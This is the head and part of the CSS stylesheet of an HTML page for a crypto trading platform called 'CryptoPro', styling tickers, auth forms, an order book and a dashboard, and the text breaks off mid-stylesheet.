<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CryptoPro â€” Professional Trading Platform</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg0:#06080D;--bg1:#0C0F18;--bg2:#131825;--bg3:#1A2030;--bg4:#202840;
  --border:rgba(255,255,255,0.06);--border2:rgba(255,255,255,0.12);
  --green:#00E676;--green2:#00C853;--green3:rgba(0,230,118,0.08);
  --red:#FF3D57;--red2:rgba(255,61,87,0.08);
  --blue:#448AFF;--yellow:#FFD740;--purple:#AA77FF;--cyan:#00E5FF;
  --text1:#EDF2F7;--text2:#8892A4;--text3:#4A5568;
  --font-display:'Syne',sans-serif;--font-body:'DM Sans',sans-serif;
  --font-mono:'IBM Plex Mono',monospace;
  --r-sm:6px;--r-md:10px;--r-lg:16px;--r-xl:24px;
}
body{font-family:var(--font-body);background:var(--bg0);color:var(--text1);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:var(--bg1)}
::-webkit-scrollbar-thumb{background:var(--bg4);border-radius:3px}
.layer{display:none;min-height:100vh;animation:layerFade .35s ease}
.layer.active{display:block}
@keyframes layerFade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes tickerMove{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
@keyframes glow{0%,100%{box-shadow:0 0 8px rgba(0,230,118,.3)}50%{box-shadow:0 0 24px rgba(0,230,118,.7),0 0 48px rgba(0,230,118,.2)}}
@keyframes slideDown{from{opacity:0;transform:translateY(-12px)}to{opacity:1;transform:translateY(0)}}
@keyframes slideUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
@keyframes countUp{from{opacity:0;transform:scale(.88)}to{opacity:1;transform:scale(1)}}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes shimmer{0%{background-position:-200px 0}100%{background-position:calc(200px + 100%) 0}}
@keyframes tradeFlash{from{background:rgba(255,255,255,.05)}to{background:transparent}}
@keyframes slideUpLeft{from{opacity:0;transform:translateX(-20px) translateY(10px)}to{opacity:1;transform:translateX(0) translateY(0)}}
@keyframes slideDownLeft{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(-30px)}}

/* NAVBAR */
.navbar{height:58px;background:rgba(6,8,13,0.98);backdrop-filter:blur(24px);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 20px;gap:14px;position:sticky;top:0;z-index:1000}
.nav-logo{display:flex;align-items:center;gap:9px;cursor:pointer;text-decoration:none;flex-shrink:0}
.nav-logo-mark{width:32px;height:32px;background:linear-gradient(135deg,var(--green),var(--green2));border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:900;color:#000;font-family:var(--font-mono);animation:glow 4s ease-in-out infinite}
.nav-logo-text{font-family:var(--font-display);font-size:17px;font-weight:800;color:var(--text1);letter-spacing:-.3px}
.nav-logo-text span{color:var(--green)}
.nav-ticker{flex:1;overflow:hidden;mask-image:linear-gradient(to right,transparent,black 5%,black 95%,transparent)}
.nav-ticker-track{display:flex;gap:28px;animation:tickerMove 55s linear infinite;white-space:nowrap}
.nt-item{display:flex;align-items:center;gap:7px;font-family:var(--font-mono);font-size:11.5px;cursor:pointer}
.nt-sym{color:var(--text2);font-weight:600}
.nt-price{color:var(--text1);font-weight:600;transition:color .2s}
.nt-chg{font-size:10.5px;padding:2px 6px;border-radius:4px;font-weight:700}
.nt-up{color:var(--green);background:var(--green3)}
.nt-dn{color:var(--red);background:var(--red2)}
.nav-right{display:flex;align-items:center;gap:8px;flex-shrink:0}
.live-badge{display:flex;align-items:center;gap:5px;padding:4px 10px;background:var(--green3);border:1px solid rgba(0,230,118,.2);border-radius:20px;font-size:11px;font-weight:700;color:var(--green);font-family:var(--font-mono)}
.live-dot{width:5px;height:5px;background:var(--green);border-radius:50%;animation:pulse 1.5s ease-in-out infinite;flex-shrink:0}
.btn{padding:8px 18px;border:none;border-radius:var(--r-md);font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;font-family:var(--font-body);letter-spacing:.1px;position:relative;overflow:hidden}
.btn-outline{background:transparent;color:var(--text2);border:1px solid var(--border2)}
.btn-outline:hover{color:var(--text1);border-color:rgba(255,255,255,.25)}
.btn-green{background:var(--green);color:#000;font-weight:700}
.btn-green:hover{background:var(--green2);transform:translateY(-1px);box-shadow:0 4px 16px rgba(0,230,118,.3)}
.notif-bell{position:relative;width:36px;height:36px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s;font-size:16px;flex-shrink:0}
.notif-bell:hover{border-color:var(--border2);background:var(--bg3)}
.notif-count{position:absolute;top:-4px;right:-4px;width:16px;height:16px;background:var(--red);border-radius:50%;font-size:9px;font-weight:800;color:#fff;display:flex;align-items:center;justify-content:center;font-family:var(--font-mono)}
.notif-dropdown{position:absolute;top:100%;right:0;margin-top:8px;width:320px;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-xl);box-shadow:0 24px 64px rgba(0,0,0,.7);z-index:1001;display:none;animation:slideDown .25s ease;overflow:hidden}
.notif-dropdown.open{display:block}
.notif-header{padding:14px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;font-size:13px;font-weight:700;font-family:var(--font-display)}
.notif-item{padding:12px 16px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s;display:flex;gap:10px;align-items:flex-start}
.notif-item:hover{background:var(--bg3)}
.notif-icon{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
.notif-text{font-size:12px;color:var(--text2);line-height:1.5}
.notif-text strong{color:var(--text1)}
.notif-time{font-size:10px;color:var(--text3);margin-top:2px}

/* TOAST */
#toast{position:fixed;top:68px;right:20px;max-width:340px;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-lg);padding:14px 18px;box-shadow:0 20px 60px rgba(0,0,0,.7);z-index:9999;display:none;animation:slideDown .3s ease;font-size:13px;line-height:1.6;white-space:pre-line}
#toast.show{display:block}
#toast.toast-green{border-left:3px solid var(--green)}
#toast.toast-red{border-left:3px solid var(--red)}
#toast.toast-blue{border-left:3px solid var(--blue)}
#toast.toast-yellow{border-left:3px solid var(--yellow)}

/* REF BANNER */
#refBanner{display:none;position:fixed;top:0;left:0;right:0;background:linear-gradient(90deg,#002b16,#004d2a,#002b16);border-bottom:1px solid rgba(0,230,118,.3);padding:16px 24px;z-index:9998;text-align:center;animation:slideDown .4s ease}
#refBanner.show{display:block}
.ref-close{position:absolute;top:50%;right:20px;transform:translateY(-50%);background:rgba(255,255,255,.1);border:none;color:#fff;width:28px;height:28px;border-radius:50%;cursor:pointer;font-size:16px;display:flex;align-items:center;justify-content:center}
.ref-bonus-amt{font-size:30px;font-weight:900;color:var(--yellow);font-family:var(--font-mono);display:block;line-height:1}

/* GLOBAL STATS BAR */
.global-stats-bar{background:#05070C;border-bottom:1px solid var(--border);padding:0;overflow:hidden;white-space:nowrap;mask-image:linear-gradient(to right,transparent,black 2%,black 98%,transparent)}
.gsb-track{display:inline-flex;align-items:center;animation:tickerMove 70s linear infinite;padding:5px 0}
.gsb-item{display:inline-flex;align-items:center;gap:5px;padding:0 14px;cursor:default}
.gsb-lbl{font-size:10px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.4px}
.gsb-val{font-size:11px;font-weight:700;color:var(--text1);font-family:var(--font-mono)}
.gsb-chg{font-size:10px;font-weight:700;font-family:var(--font-mono);padding:1px 5px;border-radius:3px}
.gsb-chg.up{color:var(--green);background:var(--green3)}
.gsb-chg.down{color:var(--red);background:var(--red2)}
.gsb-divider{width:1px;height:14px;background:var(--border2);flex-shrink:0}

/* MARKET BAR */
.market-bar{background:var(--bg1);border-bottom:1px solid var(--border);padding:5px 0;overflow:hidden;mask-image:linear-gradient(to right,transparent,black 3%,black 97%,transparent)}
.market-bar-track{display:flex;gap:24px;animation:tickerMove 45s linear infinite;padding:0 16px;white-space:nowrap}
.mb-item{display:flex;align-items:center;gap:6px;font-size:11px;font-family:var(--font-mono);cursor:pointer}
.mb-sym{color:var(--text2);font-weight:600}
.mb-price{color:var(--text1)}
.mb-chg{font-size:11px;padding:1px 5px;border-radius:3px}

/* SOCIAL PROOF POPUP */
.sp-popup{position:fixed;bottom:24px;left:24px;z-index:1800;display:flex;align-items:center;gap:12px;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-lg);padding:12px 16px;box-shadow:0 16px 48px rgba(0,0,0,.7);min-width:280px;max-width:340px;animation:slideUpLeft .4s cubic-bezier(.16,1,.3,1);cursor:pointer;transition:transform .2s}
.sp-popup:hover{transform:translateY(-2px)}
.sp-popup.hide{animation:slideDownLeft .3s ease forwards}
.sp-popup-icon{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
.sp-popup-text{flex:1;min-width:0}
.sp-popup-title{font-size:13px;font-weight:700;color:var(--text1);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.sp-popup-sub{font-size:11px;color:var(--text2);margin-top:1px}
.sp-popup-amount{font-family:var(--font-mono);font-size:13px;font-weight:800;flex-shrink:0}
.sp-popup-close{position:absolute;top:6px;right:8px;font-size:11px;color:var(--text3);cursor:pointer;padding:2px 4px;background:none;border:none}

/* MOBILE BOTTOM NAV */
.mobile-bottom-nav{display:none;position:fixed;bottom:0;left:0;right:0;height:64px;background:rgba(12,15,24,0.98);border-top:1px solid var(--border);z-index:900;backdrop-filter:blur(20px)}
.mbn-inner{display:flex;align-items:center;height:100%}
.mbn-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;cursor:pointer;transition:all .2s;padding:8px 4px;position:relative}
.mbn-item.active .mbn-icon,.mbn-item.active .mbn-label{color:var(--green)}
.mbn-item.active::before{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:32px;height:2px;background:var(--green);border-radius:0 0 2px 2px}
.mbn-icon{font-size:20px;color:var(--text3);transition:all .2s}
.mbn-label{font-size:10px;font-weight:600;color:var(--text3);transition:all .2s}
.mbn-badge{position:absolute;top:4px;right:calc(50% - 18px);background:var(--red);color:#fff;font-size:8px;font-weight:800;width:14px;height:14px;border-radius:50%;display:flex;align-items:center;justify-content:center}
@media(max-width:900px){.mobile-bottom-nav{display:block}body{padding-bottom:64px}#aiBtn{bottom:80px}#aiPanel{bottom:136px}}

/* HERO */
.hero{position:relative;padding:80px 40px 60px;text-align:center;overflow:hidden}
.hero::before{content:'';position:absolute;top:-200px;left:50%;transform:translateX(-50%);width:900px;height:900px;background:radial-gradient(ellipse,rgba(0,230,118,.06) 0%,transparent 70%);pointer-events:none}
.hero-grid{position:absolute;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:40px 40px;mask-image:radial-gradient(ellipse 80% 60% at 50% 0%,black,transparent);opacity:.4}
.hero-tag{display:inline-flex;align-items:center;gap:6px;background:var(--green3);border:1px solid rgba(0,230,118,.2);border-radius:20px;padding:6px 14px;font-size:12px;font-weight:600;color:var(--green);font-family:var(--font-mono);margin-bottom:24px;animation:countUp .5s ease .1s both}
.hero-title{font-family:var(--font-display);font-size:clamp(36px,6vw,68px);font-weight:800;line-height:1.05;letter-spacing:-1.5px;margin-bottom:20px;animation:countUp .5s ease .2s both}
.hero-title .accent{color:var(--green)}
.hero-title .dim{color:var(--text2)}
.hero-sub{font-size:17px;color:var(--text2);max-width:560px;margin:0 auto 36px;line-height:1.65;animation:countUp .5s ease .3s both}
.hero-cta{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;animation:countUp .5s ease .4s both}
.btn-hero-primary{padding:14px 32px;background:var(--green);color:#000;border:none;border-radius:var(--r-md);font-size:15px;font-weight:700;cursor:pointer;transition:all .25s;font-family:var(--font-display)}
.btn-hero-primary:hover{background:var(--green2);transform:translateY(-2px);box-shadow:0 8px 28px rgba(0,230,118,.35)}
.btn-hero-secondary{padding:14px 32px;background:transparent;color:var(--text1);border:1px solid var(--border2);border-radius:var(--r-md);font-size:15px;font-weight:600;cursor:pointer;transition:all .25s}
.btn-hero-secondary:hover{border-color:rgba(255,255,255,.3);background:var(--bg2)}

/* STATS BAR */
.stats-bar{display:flex;justify-content:center;border-top:1px solid var(--border);border-bottom:1px solid var(--border);background:var(--bg1)}
.stat-item{flex:1;max-width:220px;padding:24px 20px;text-align:center;border-right:1px solid var(--border);transition:background .2s}
.stat-item:last-child{border-right:none}
.stat-item:hover{background:var(--bg2)}
.stat-val{font-family:var(--font-mono);font-size:26px;font-weight:700;color:var(--green);display:block;margin-bottom:4px}
.stat-lbl{font-size:12px;color:var(--text3);text-transform:uppercase;letter-spacing:.8px}

/* TRADERS SECTION */
.traders-section{padding:32px 24px;border-bottom:1px solid var(--border)}
.section-header{display:flex;align-items:center;gap:10px;margin-bottom:16px}
.section-title{font-family:var(--font-display);font-size:14px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:1px}
.section-badge{font-size:10px;padding:2px 8px;background:var(--red2);color:var(--red);border-radius:10px;font-weight:700;font-family:var(--font-mono);animation:pulse 2s infinite}
.traders-track-wrap{overflow:hidden;mask-image:linear-gradient(to right,transparent,black 4%,black 96%,transparent)}
.traders-track{display:flex;gap:12px;animation:tickerMove 80s linear infinite;white-space:nowrap}
.trader-chip{display:inline-flex;align-items:center;gap:10px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);padding:10px 16px;min-width:200px;cursor:pointer;transition:border-color .2s}
.trader-chip:hover{border-color:var(--border2)}
.trader-avatar{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--blue));display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
.trader-name{font-size:13px;font-weight:600;color:var(--text1)}
.trader-profit{font-size:13px;font-weight:700;color:var(--green);font-family:var(--font-mono)}
.trader-time{font-size:10px;color:var(--text3)}

/* WINNERS */
.winners-section{padding:40px 24px;border-bottom:1px solid var(--border)}
.winners-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-top:20px}
.winner-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:20px;transition:all .25s;position:relative;overflow:hidden;cursor:pointer}
.winner-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));opacity:0;transition:opacity .25s}
.winner-card:hover{border-color:var(--border2);transform:translateY(-3px);box-shadow:0 12px 36px rgba(0,0,0,.4)}
.winner-card:hover::before{opacity:1}
.winner-rank{position:absolute;top:14px;right:14px;font-size:20px}
.winner-head{display:flex;align-items:center;gap:12px;margin-bottom:16px}
.winner-ava{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,var(--green3),rgba(0,229,255,.1));border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:22px}
.winner-name{font-weight:700;font-size:15px}
.winner-loc{font-size:12px;color:var(--text2);margin-top:2px}
.winner-stats{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.winner-stat{background:var(--bg2);border-radius:var(--r-md);padding:10px 12px;text-align:center}
.ws-val{font-family:var(--font-mono);font-size:17px;font-weight:700;color:var(--green)}
.ws-lbl{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:2px}

/* FEATURES */
.features-section{padding:48px 24px;border-bottom:1px solid var(--border)}
.features-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px;margin-top:24px}
.feature-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:24px;transition:all .25s;cursor:pointer}
.feature-card:hover{border-color:var(--border2);background:var(--bg2);transform:translateY(-2px)}
.feature-icon{width:44px;height:44px;border-radius:var(--r-md);display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:16px}
.fi-green{background:var(--green3)}.fi-blue{background:rgba(68,138,255,.1)}.fi-yellow{background:rgba(255,215,64,.1)}.fi-purple{background:rgba(170,119,255,.1)}.fi-red{background:var(--red2)}.fi-cyan{background:rgba(0,229,255,.1)}
.feature-title{font-weight:700;font-size:15px;margin-bottom:6px;font-family:var(--font-display)}
.feature-desc{font-size:13px;color:var(--text2);line-height:1.55}

/* REVIEWS */
.reviews-section{padding:48px 24px}
.reviews-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-top:24px}
.review-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:20px;transition:all .2s}
.review-card:hover{border-color:var(--border2)}
.review-head{display:flex;align-items:center;gap:12px;margin-bottom:12px}
.review-ava{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,var(--bg3),var(--bg4));display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
.review-name{font-weight:600;font-size:14px}
.review-loc{font-size:11px;color:var(--text3)}
.review-stars{color:var(--yellow);font-size:12px;letter-spacing:1px;margin-top:3px}
.review-body{font-size:13px;color:var(--text2);line-height:1.6;font-style:italic}

/* CTA + FOOTER */
.cta-section{padding:64px 24px;text-align:center;border-top:1px solid var(--border);background:radial-gradient(ellipse 60% 80% at 50% 100%,rgba(0,230,118,.04),transparent)}
.cta-title{font-family:var(--font-display);font-size:clamp(28px,4vw,44px);font-weight:800;letter-spacing:-.8px;margin-bottom:16px}
.cta-sub{font-size:16px;color:var(--text2);max-width:440px;margin:0 auto 32px;line-height:1.6}
.footer{background:var(--bg1);border-top:1px solid var(--border);padding:24px;text-align:center;font-size:12px;color:var(--text3)}

/* AUTH */
.auth-page{display:grid;grid-template-columns:1fr 1fr;min-height:100vh}
.auth-left{background:linear-gradient(160deg,var(--bg1) 0%,var(--bg2) 100%);border-right:1px solid var(--border);display:flex;align-items:center;justify-content:center;padding:48px;position:relative;overflow:hidden}
.auth-left::before{content:'';position:absolute;bottom:-160px;right:-160px;width:500px;height:500px;background:radial-gradient(circle,rgba(0,230,118,.06),transparent 65%);pointer-events:none}
.auth-left::after{content:'';position:absolute;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:36px 36px;opacity:.35}
.auth-left-inner{position:relative;z-index:1;max-width:380px;width:100%}
.auth-big-title{font-family:var(--font-display);font-size:54px;font-weight:800;letter-spacing:-1.5px;line-height:1.05;margin-bottom:16px}
.auth-big-sub{font-size:15px;color:var(--text2);line-height:1.65;margin-bottom:32px}
.auth-trust-list{display:flex;flex-direction:column;gap:10px;margin-bottom:28px}
.auth-trust-item{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text2)}
.auth-live-card{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--r-lg);padding:14px 16px}
.signup-bonus-card{background:linear-gradient(135deg,rgba(0,230,118,.15),rgba(0,200,83,.06));border:1px solid rgba(0,230,118,.25);border-radius:var(--r-xl);padding:20px;margin-bottom:28px}
.auth-steps{display:flex;flex-direction:column;gap:12px}
.auth-step{display:flex;align-items:center;gap:12px;font-size:13px;color:var(--text2)}
.step-num{width:24px;height:24px;border-radius:50%;background:var(--green3);border:1px solid rgba(0,230,118,.3);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--green);font-family:var(--font-mono);flex-shrink:0}
.auth-right{display:flex;align-items:center;justify-content:center;padding:40px 32px;background:var(--bg0);overflow-y:auto}
.auth-card{width:100%;max-width:420px;animation:layerFade .4s ease}
.auth-form-title{font-family:var(--font-display);font-size:28px;font-weight:800;letter-spacing:-.5px;margin-bottom:6px}
.auth-form-sub{font-size:13px;color:var(--text2);margin-bottom:20px}
.form-group{margin-bottom:18px}
.form-label{display:flex;justify-content:space-between;align-items:center;font-size:12px;font-weight:600;color:var(--text2);text-transform:uppercase;letter-spacing:.6px;margin-bottom:7px}
.form-label-link{color:var(--green);font-weight:600;cursor:pointer;text-transform:none;letter-spacing:0;font-size:12px}
.input-wrap{position:relative;display:flex;align-items:center}
.input-icon{position:absolute;left:13px;font-size:15px;pointer-events:none;z-index:1}
.form-input{width:100%;padding:12px 14px 12px 40px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:14px;font-family:var(--font-body);transition:all .2s}
.form-input:focus{outline:none;border-color:rgba(0,230,118,.5);box-shadow:0 0 0 3px rgba(0,230,118,.08)}
.form-input::placeholder{color:var(--text3)}
.input-eye{position:absolute;right:12px;background:none;border:none;cursor:pointer;font-size:14px;color:var(--text3);padding:4px}
.btn-auth{width:100%;padding:13px;background:var(--green);color:#000;border:none;border-radius:var(--r-md);font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;font-family:var(--font-display);display:flex;align-items:center;justify-content:center;gap:8px}
.btn-auth:hover{background:var(--green2);transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,230,118,.3)}
.btn-auth:disabled{opacity:.6;cursor:not-allowed;transform:none}
.btn-auth-outline{padding:13px 20px;background:transparent;color:var(--text2);border:1px solid var(--border2);border-radius:var(--r-md);font-size:14px;font-weight:600;cursor:pointer;transition:all .2s;font-family:var(--font-body)}
.btn-spinner{display:inline-block;animation:spin 1s linear infinite;font-size:16px}
.form-alert{padding:11px 14px;border-radius:var(--r-md);font-size:13px;margin-bottom:16px;border-left:3px solid}
.form-alert.error{background:var(--red2);border-color:var(--red);color:var(--red)}
.form-alert.success{background:var(--green3);border-color:var(--green);color:var(--green)}
.auth-divider{display:flex;align-items:center;gap:12px;margin:20px 0;color:var(--text3);font-size:12px}
.auth-divider::before,.auth-divider::after{content:'';flex:1;height:1px;background:var(--border)}
.social-btn{padding:10px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:13px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:7px;transition:all .2s}
.social-btn:hover{border-color:var(--border2);background:var(--bg3)}
.auth-switch-text{text-align:center;font-size:13px;color:var(--text2);margin-top:16px}
.auth-switch-text a{color:var(--green);cursor:pointer;font-weight:600}
.signup-progress{margin-bottom:24px}
.sp-bar{height:3px;background:var(--bg3);border-radius:2px;margin-bottom:8px;overflow:hidden}
.sp-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--cyan));border-radius:2px;transition:width .4s ease}
.sp-steps{display:flex;justify-content:space-between}
.sp-step{font-size:11px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.5px;transition:color .3s}
.sp-step.active{color:var(--green)}
.pwd-strength{display:flex;align-items:center;gap:8px;margin-top:6px}
.pwd-bar{flex:1;height:3px;background:var(--bg3);border-radius:2px;overflow:hidden}
.pwd-fill{height:100%;border-radius:2px;transition:all .3s;width:0%}
.confirm-box{background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-xl);padding:20px;margin-bottom:16px}
.confirm-row{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px solid var(--border);font-size:13px}
.confirm-row:last-child{border-bottom:none}
.confirm-row span:first-child{color:var(--text2)}
.checkbox-row{display:flex;align-items:flex-start;gap:10px;font-size:12px;color:var(--text2);line-height:1.5;cursor:pointer}
.checkbox-row input{margin-top:2px;accent-color:var(--green)}

/* PAIR BAR */
.pair-bar{background:var(--bg1);border-bottom:1px solid var(--border);overflow-x:auto}
.pair-bar::-webkit-scrollbar{height:3px}
.pair-bar-inner{display:flex;gap:2px;padding:6px 16px;white-space:nowrap}
.pair-btn{padding:6px 14px;background:transparent;border:none;border-radius:var(--r-sm);color:var(--text2);font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;font-family:var(--font-mono)}
.pair-btn:hover{color:var(--text1);background:var(--bg3)}
.pair-btn.active{color:var(--green);background:var(--green3)}

/* PRICE HEADER */
.price-header{display:flex;align-items:center;gap:20px;padding:10px 20px;background:var(--bg1);border-bottom:1px solid var(--border);flex-wrap:wrap}
.ph-left{display:flex;align-items:baseline;gap:10px}
.ph-pair{font-family:var(--font-display);font-size:16px;font-weight:800}
.ph-price{font-family:var(--font-mono);font-size:26px;font-weight:700;transition:color .3s}
.ph-price.up{color:var(--green)}.ph-price.down{color:var(--red)}
.ph-change{font-family:var(--font-mono);font-size:14px;font-weight:700;padding:3px 10px;border-radius:var(--r-sm)}
.ph-change.up{color:var(--green);background:var(--green3)}
.ph-change.down{color:var(--red);background:var(--red2)}
.ph-stats{display:flex;gap:20px;flex:1;flex-wrap:wrap}
.ph-stat{display:flex;flex-direction:column;gap:2px}
.ph-stat-lbl{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px}
.ph-stat-val{font-family:var(--font-mono);font-size:13px;font-weight:600}
.interval-btns{display:flex;gap:2px}
.iv-btn{padding:5px 10px;background:transparent;border:1px solid transparent;border-radius:var(--r-sm);color:var(--text3);font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;font-family:var(--font-mono)}
.iv-btn:hover{color:var(--text1)}
.iv-btn.active{color:var(--green);border-color:rgba(0,230,118,.3);background:var(--green3)}

/* CHART LAYOUT */
.chart-layout{display:grid;grid-template-columns:1fr 200px 180px;height:calc(100vh - 210px);min-height:500px;border-bottom:1px solid var(--border)}
.chart-main{display:flex;flex-direction:column;border-right:1px solid var(--border);min-width:0;overflow:hidden}
.indicator-bar{display:flex;align-items:center;gap:8px;padding:7px 12px;background:var(--bg1);border-bottom:1px solid var(--border);flex-wrap:wrap}
.ind-btn{padding:4px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text2);font-size:11px;font-weight:600;cursor:pointer;transition:all .2s;font-family:var(--font-mono)}
.ind-btn:hover{color:var(--text1)}
.ind-btn.active{color:var(--green);border-color:rgba(0,230,118,.3);background:var(--green3)}
#tvChartContainer,.tv-chart-wrapper{flex:1;min-height:0;position:relative}
.vol-wrap-tv{height:70px;position:relative;border-top:1px solid var(--border)}
.depth-section{padding:12px 16px;background:var(--bg1);border-top:1px solid var(--border)}
.depth-wrap{height:100px;position:relative;background:var(--bg0);border-radius:var(--r-md);overflow:hidden;border:1px solid var(--border)}
.depth-wrap canvas{position:absolute;inset:0;width:100%;height:100%}

/* ORDER BOOK */
.orderbook-panel{display:flex;flex-direction:column;background:var(--bg1);overflow:hidden}
.ob-header{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;border-bottom:1px solid var(--border);flex-shrink:0}
.ob-title{font-size:13px;font-weight:700;font-family:var(--font-display)}
.ob-labels{display:grid;grid-template-columns:1fr 1fr 1fr;padding:6px 10px;font-size:9.5px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.4px;flex-shrink:0}
.ob-labels span:last-child{text-align:right}
.ob-asks{flex:1;overflow-y:auto;display:flex;flex-direction:column-reverse}
.ob-bids{flex:1;overflow-y:auto}
.ob-asks::-webkit-scrollbar,.ob-bids::-webkit-scrollbar{width:2px}
.ob-row{display:grid;grid-template-columns:1fr 1fr 1fr;padding:2px 10px;font-size:11px;font-family:var(--font-mono);position:relative;cursor:pointer;transition:background .15s}
.ob-row:hover{background:rgba(255,255,255,.04)}
.ob-price{font-weight:600}
.ob-price.ask{color:var(--red)}
.ob-price.bid{color:var(--green)}
.ob-amt{color:var(--text2);text-align:center}
.ob-total{color:var(--text3);text-align:right}
.ob-spread{display:flex;align-items:center;justify-content:space-between;padding:6px 10px;background:var(--bg2);border-top:1px solid var(--border);border-bottom:1px solid var(--border);flex-shrink:0}
.ob-spread-price{font-family:var(--font-mono);font-size:14px;font-weight:700;color:var(--green)}
.ob-spread-pct{font-family:var(--font-mono);font-size:10px;color:var(--text3)}

/* TRADES PANEL */
.trades-panel{display:flex;flex-direction:column;background:var(--bg1);border-left:1px solid var(--border);overflow:hidden}
.tp-labels{display:grid;grid-template-columns:1fr 1fr 1fr;padding:6px 10px;font-size:9.5px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.4px;flex-shrink:0}
.tp-labels span:last-child{text-align:right}
.tp-feed{flex:1;overflow-y:auto}
.tp-feed::-webkit-scrollbar{width:2px}
.tp-row{display:grid;grid-template-columns:1fr 1fr 1fr;padding:3px 10px;font-size:11px;font-family:var(--font-mono);animation:tradeFlash .3s ease}
.tp-price{font-weight:600}
.tp-price.buy{color:var(--green)}
.tp-price.sell{color:var(--red)}
.tp-amt{color:var(--text2);text-align:center}
.tp-time{color:var(--text3);text-align:right}

/* DASHBOARD */
.dash-body{display:grid;grid-template-columns:220px 1fr;min-height:calc(100vh - 92px)}
.dash-sidebar{background:var(--bg1);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto}
.sidebar-balance{padding:20px 16px;border-bottom:1px solid var(--border)}
.sbl-label{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;font-weight:600;margin-bottom:4px}
.sbl-amount{font-family:var(--font-mono);font-size:24px;font-weight:700;color:var(--green);margin-bottom:2px}
.sbl-sub{font-size:11px;color:var(--text3);margin-bottom:12px}
.mode-toggle{display:flex;gap:4px;background:var(--bg0);border-radius:var(--r-md);padding:3px}
